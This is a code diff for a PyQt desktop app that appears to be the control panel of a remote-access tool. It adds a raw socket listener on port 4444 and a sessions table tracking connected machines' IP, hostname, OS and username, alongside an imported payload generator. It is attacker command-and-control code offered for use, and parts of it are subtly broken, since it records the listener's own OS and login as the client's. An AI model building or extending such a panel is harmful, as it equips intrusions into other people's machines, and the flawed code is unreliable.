@@ -1,55 +1,80 @@
+from PyQt5.QtWidgets import (
+    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
+    QPushButton, QTextEdit, QLabel, QLineEdit, QTabWidget,
+    QTableWidget, QTableWidgetItem, QHeaderView, QMessageBox,
+    QComboBox, QSpinBox, QFileDialog, QGroupBox, QFormLayout,
+    QGridLayout, QCheckBox
+)
+from PyQt5.QtCore import Qt, QThread, pyqtSignal
+from PyQt5.QtGui import QFont, QIcon, QColor
 import sys
 import os
 import json
 import threading
 import time
 from datetime import datetime
-from PyQt6.QtWidgets import (
-    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
-    QPushButton, QTextEdit, QLabel, QLineEdit, QTabWidget,
-    QTableWidget, QTableWidgetItem, QHeaderView, QMessageBox,
-    QComboBox, QSpinBox, QFileDialog, QGroupBox, QFormLayout
-)
-from PyQt6.QtCore import Qt, QThread, pyqtSignal
-from PyQt6.QtGui import QFont, QIcon, QColor
+import socket
+import platform
+import psutil
 import qdarkstyle
 from flask import Flask, request, jsonify
-import socket
 import subprocess
 import tempfile
 from .session_window import SessionWindow
 from .payload_generator import PayloadGenerator
 
 class ListenerThread(QThread):
-    new_connection = pyqtSignal(str, str)
-    connection_lost = pyqtSignal(str)
+    connection_received = pyqtSignal(str, dict)
+    data_updated = pyqtSignal(str, dict)
     
     def __init__(self, port):
         super().__init__()
         self.port = port
         self.running = True
-        self.app = Flask(__name__)
-        self.setup_routes()
+        self.active_connections = {}  # Store active connections
         
-    def setup_routes(self):
-        @self.app.route('/connect', methods=['POST'])
-        def handle_connect():
-            data = request.get_json()
-            client_id = data.get('client_id')
-            client_info = data.get('info', {})
-            self.new_connection.emit(client_id, json.dumps(client_info))
-            return jsonify({'status': 'success'})
-            
-        @self.app.route('/heartbeat', methods=['POST'])
-        def handle_heartbeat():
-            return jsonify({'status': 'success'})
-    
     def run(self):
-        self.app.run(host='0.0.0.0', port=self.port)
-    
+        try:
+            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            server.bind(('0.0.0.0', self.port))
+            server.listen(5)
+            
+            while self.running:
+                try:
+                    client, addr = server.accept()
+                    client_info = {
+                        'ip': addr[0],
+                        'port': addr[1],
+                        'hostname': socket.gethostbyaddr(addr[0])[0],
+                        'os': platform.system(),
+                        'username': os.getlogin()
+                    }
+                    
+                    # Check if we already have a connection from this IP
+                    if addr[0] in self.active_connections:
+                        # Update existing connection
+                        self.data_updated.emit(str(addr), client_info)
+                    else:
+                        # New connection
+                        self.active_connections[addr[0]] = client
+                        self.connection_received.emit(str(addr), client_info)
+                        
+                except Exception as e:
+                    print(f"Error accepting connection: {str(e)}")
+                    
+        except Exception as e:
+            print(f"Error starting listener: {str(e)}")
+            
     def stop(self):
         self.running = False
-        # Implement proper Flask shutdown here
+        # Close all active connections
+        for client in self.active_connections.values():
+            try:
+                client.close()
+            except:
+                pass
+        self.active_connections.clear()
 
 class MainWindow(QMainWindow):
     def __init__(self):
@@ -94,34 +119,27 @@ class MainWindow(QMainWindow):
         layout = QVBoxLayout(listener_widget)
         
         # Listener controls
-        controls_layout = QHBoxLayout()
+        controls_group = QGroupBox("Listener Controls")
+        controls_layout = QGridLayout()
         
-        # Port input
-        port_layout = QHBoxLayout()
-        port_label = QLabel("Port:")
         self.port_input = QSpinBox()
         self.port_input.setRange(1, 65535)
-        self.port_input.setValue(8080)
-        port_layout.addWidget(port_label)
-        port_layout.addWidget(self.port_input)
+        self.port_input.setValue(4444)
         
-        # Start/Stop button
-        self.listener_button = QPushButton("Start Listener")
-        self.listener_button.clicked.connect(self.toggle_listener)
+        self.start_button = QPushButton("Start Listener")
+        self.start_button.clicked.connect(self.toggle_listener)
         
-        controls_layout.addLayout(port_layout)
-        controls_layout.addWidget(self.listener_button)
-        controls_layout.addStretch()
+        controls_layout.addWidget(QLabel("Port:"), 0, 0)
+        controls_layout.addWidget(self.port_input, 0, 1)
+        controls_layout.addWidget(self.start_button, 0, 2)
         
-        layout.addLayout(controls_layout)
+        controls_group.setLayout(controls_layout)
+        layout.addWidget(controls_group)
         
-        # Active listeners table
-        self.listeners_table = QTableWidget()
-        self.listeners_table.setColumnCount(3)
-        self.listeners_table.setHorizontalHeaderLabels(["Port", "Status", "Actions"])
-        self.listeners_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
-        
-        layout.addWidget(self.listeners_table)
+        # Status area
+        self.status_area = QTextEdit()
+        self.status_area.setReadOnly(True)
+        layout.addWidget(self.status_area)
         
         self.tabs.addTab(listener_widget, "Listeners")
         
@@ -187,50 +205,184 @@ class MainWindow(QMainWindow):
         sessions_widget = QWidget()
         layout = QVBoxLayout(sessions_widget)
         
-        # Sessions table
+        # Sessions table with improved styling
         self.sessions_table = QTableWidget()
-        self.sessions_table.setColumnCount(4)
-        self.sessions_table.setHorizontalHeaderLabels(["ID", "IP", "First Seen", "Status"])
+        self.sessions_table.setColumnCount(6)
+        self.sessions_table.setHorizontalHeaderLabels([
+            "ID", "IP", "Hostname", "OS", "Username", "Status"
+        ])
         self.sessions_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
-        self.sessions_table.itemDoubleClicked.connect(self.open_session)
+        self.sessions_table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
+        self.sessions_table.setSelectionMode(QTableWidget.SelectionMode.SingleSelection)
+        self.sessions_table.setAlternatingRowColors(True)
+        self.sessions_table.setStyleSheet("""
+            QTableWidget {
+                border: 1px solid #3a3a3a;
+                border-radius: 4px;
+                background-color: #2b2b2b;
+                gridline-color: #3a3a3a;
+            }
+            QTableWidget::item {
+                padding: 5px;
+                color: #ffffff;
+            }
+            QTableWidget::item:selected {
+                background-color: #0d47a1;
+            }
+            QHeaderView::section {
+                background-color: #1e1e1e;
+                color: #ffffff;
+                padding: 5px;
+                border: 1px solid #3a3a3a;
+            }
+        """)
+        
+        # Session controls
+        controls_layout = QHBoxLayout()
+        
+        # View button
+        self.view_session_btn = QPushButton("View Session")
+        self.view_session_btn.setStyleSheet("""
+            QPushButton {
+                background-color: #0d47a1;
+                color: white;
+                border: none;
+                padding: 8px 16px;
+                border-radius: 4px;
+            }
+            QPushButton:hover {
+                background-color: #1565c0;
+            }
+            QPushButton:disabled {
+                background-color: #424242;
+            }
+        """)
+        self.view_session_btn.clicked.connect(self.open_selected_session)
+        self.view_session_btn.setEnabled(False)
+        
+        # Remove button
+        self.remove_session_btn = QPushButton("Remove Session")
+        self.remove_session_btn.setStyleSheet("""
+            QPushButton {
+                background-color: #b71c1c;
+                color: white;
+                border: none;
+                padding: 8px 16px;
+                border-radius: 4px;
+            }
+            QPushButton:hover {
+                background-color: #c62828;
+            }
+            QPushButton:disabled {
+                background-color: #424242;
+            }
+        """)
+        self.remove_session_btn.clicked.connect(self.remove_selected_session)
+        self.remove_session_btn.setEnabled(False)
+        
+        controls_layout.addWidget(self.view_session_btn)
+        controls_layout.addWidget(self.remove_session_btn)
+        controls_layout.addStretch()
+        
+        # Connect selection changed signal
+        self.sessions_table.itemSelectionChanged.connect(self.on_session_selection_changed)
         
         layout.addWidget(self.sessions_table)
+        layout.addLayout(controls_layout)
         
         self.tabs.addTab(sessions_widget, "Sessions")
         
+    def on_session_selection_changed(self):
+        has_selection = len(self.sessions_table.selectedItems()) > 0
+        self.view_session_btn.setEnabled(has_selection)
+        self.remove_session_btn.setEnabled(has_selection)
+        
+    def open_selected_session(self):
+        selected_items = self.sessions_table.selectedItems()
+        if not selected_items:
+            return
+            
+        row = selected_items[0].row()
+        session_id = self.sessions_table.item(row, 0).text()
+        
+        if session_id in self.active_sessions:
+            if session_id not in self.session_windows:
+                session_window = SessionWindow(session_id, self.active_sessions[session_id])
+                self.session_windows[session_id] = session_window
+            self.session_windows[session_id].show()
+            self.session_windows[session_id].raise_()
+            self.statusBar().showMessage(f"Opened session: {session_id}")
+            
+    def remove_selected_session(self):
+        selected_items = self.sessions_table.selectedItems()
+        if not selected_items:
+            return
+            
+        row = selected_items[0].row()
+        session_id = self.sessions_table.item(row, 0).text()
+        
+        reply = QMessageBox.question(
+            self,
+            "Confirm Removal",
+            f"Are you sure you want to remove session {session_id}?",
+            QMessageBox.Yes | QMessageBox.No,
+            QMessageBox.No
+        )
+        
+        if reply == QMessageBox.Yes:
+            if session_id in self.session_windows:
+                self.session_windows[session_id].close()
+                del self.session_windows[session_id]
+            if session_id in self.active_sessions:
+                del self.active_sessions[session_id]
+            self.update_sessions_table()
+            self.statusBar().showMessage(f"Removed session: {session_id}")
+            
+    def update_sessions_table(self):
+        self.sessions_table.setRowCount(len(self.active_sessions))
+        for i, (session_id, info) in enumerate(self.active_sessions.items()):
+            self.sessions_table.setItem(i, 0, QTableWidgetItem(session_id))
+            self.sessions_table.setItem(i, 1, QTableWidgetItem(info['ip']))
+            self.sessions_table.setItem(i, 2, QTableWidgetItem(info.get('hostname', 'Unknown')))
+            self.sessions_table.setItem(i, 3, QTableWidgetItem(info.get('os', 'Unknown')))
+            self.sessions_table.setItem(i, 4, QTableWidgetItem(info.get('username', 'Unknown')))
+            self.sessions_table.setItem(i, 5, QTableWidgetItem("Active"))
+            
+    def handle_connection(self, session_id, client_info):
+        self.status_area.append(f"New connection from {client_info['ip']}")
+        
+        # Only add to active sessions, don't create window automatically
+        self.active_sessions[session_id] = client_info
+        self.update_sessions_table()
+        self.statusBar().showMessage(f"New session available: {session_id}")
+        
+    def handle_data_update(self, session_id, client_info):
+        # Update existing session info
+        if session_id in self.active_sessions:
+            self.active_sessions[session_id].update(client_info)
+            self.update_sessions_table()
+            # Only update status bar if window is open
+            if session_id in self.session_windows:
+                self.statusBar().showMessage(f"Updated session: {session_id}")
+            
     def toggle_listener(self):
-        port = self.port_input.value()
-        if port in self.active_listeners:
-            # Stop listener
-            self.active_listeners[port].stop()
-            del self.active_listeners[port]
-            self.listener_button.setText("Start Listener")
-            self.update_listeners_table()
-        else:
+        if not hasattr(self, 'listener_thread') or not self.listener_thread.isRunning():
             # Start listener
-            listener = ListenerThread(port)
-            listener.new_connection.connect(self.handle_new_connection)
-            listener.connection_lost.connect(self.handle_connection_lost)
-            listener.start()
-            self.active_listeners[port] = listener
-            self.listener_button.setText("Stop Listener")
-            self.update_listeners_table()
+            port = self.port_input.value()
+            self.listener_thread = ListenerThread(port)
+            self.listener_thread.connection_received.connect(self.handle_connection)
+            self.listener_thread.data_updated.connect(self.handle_data_update)
+            self.listener_thread.start()
             
-    def update_listeners_table(self):
-        self.listeners_table.setRowCount(len(self.active_listeners))
-        for i, (port, listener) in enumerate(self.active_listeners.items()):
-            self.listeners_table.setItem(i, 0, QTableWidgetItem(str(port)))
-            self.listeners_table.setItem(i, 1, QTableWidgetItem("Running"))
+            self.start_button.setText("Stop Listener")
+            self.status_area.append(f"Started listener on port {port}")
+        else:
+            # Stop listener
+            self.listener_thread.stop()
+            self.listener_thread.wait()
             
-            stop_button = QPushButton("Stop")
-            stop_button.clicked.connect(lambda checked, p=port: self.stop_listener(p))
-            self.listeners_table.setCellWidget(i, 2, stop_button)
-            
-    def stop_listener(self, port):
-        if port in self.active_listeners:
-            self.active_listeners[port].stop()
-            del self.active_listeners[port]
-            self.update_listeners_table()
+            self.start_button.setText("Start Listener")
+            self.status_area.append("Stopped listener")
             
     def validate_payload_config(self):
         host = self.payload_host.text()
@@ -303,54 +455,12 @@ class MainWindow(QMainWindow):
             QMessageBox.critical(self, "Error", f"Failed to save payload: {str(e)}")
             self.statusBar().showMessage("Failed to save payload")
             
-    def handle_new_connection(self, client_id, client_info):
-        try:
-            # Add to sessions table
-            row = self.sessions_table.rowCount()
-            self.sessions_table.insertRow(row)
-            self.sessions_table.setItem(row, 0, QTableWidgetItem(client_id))
-            self.sessions_table.setItem(row, 1, QTableWidgetItem(client_info.get('ip', 'Unknown')))
-            self.sessions_table.setItem(row, 2, QTableWidgetItem(datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
-            self.sessions_table.setItem(row, 3, QTableWidgetItem("Active"))
-            
-            # Store session info
-            self.active_sessions[client_id] = json.loads(client_info)
-            self.statusBar().showMessage(f"New connection from {client_info.get('ip', 'Unknown')}")
-            
-        except Exception as e:
-            QMessageBox.warning(self, "Error", f"Failed to handle new connection: {str(e)}")
-            
-    def handle_connection_lost(self, client_id):
-        try:
-            # Update session status
-            for row in range(self.sessions_table.rowCount()):
-                if self.sessions_table.item(row, 0).text() == client_id:
-                    self.sessions_table.setItem(row, 3, QTableWidgetItem("Disconnected"))
-                    self.statusBar().showMessage(f"Connection lost: {client_id}")
-                    break
-                    
-        except Exception as e:
-            QMessageBox.warning(self, "Error", f"Failed to handle connection loss: {str(e)}")
-            
-    def open_session(self, item):
-        try:
-            client_id = item.text()
-            if client_id in self.active_sessions:
-                if client_id not in self.session_windows:
-                    session_window = SessionWindow(client_id, self.active_sessions[client_id])
-                    self.session_windows[client_id] = session_window
-                self.session_windows[client_id].show()
-                self.session_windows[client_id].raise_()
-                self.statusBar().showMessage(f"Opened session: {client_id}")
-                
-        except Exception as e:
-            QMessageBox.warning(self, "Error", f"Failed to open session: {str(e)}")
-            
     def closeEvent(self, event):
         try:
             # Clean up resources
-            for listener in self.active_listeners.values():
-                listener.stop()
+            if hasattr(self, 'listener_thread') and self.listener_thread.isRunning():
+                self.listener_thread.stop()
+                self.listener_thread.wait()
             for window in self.session_windows.values():
                 window.close()
             event.accept()
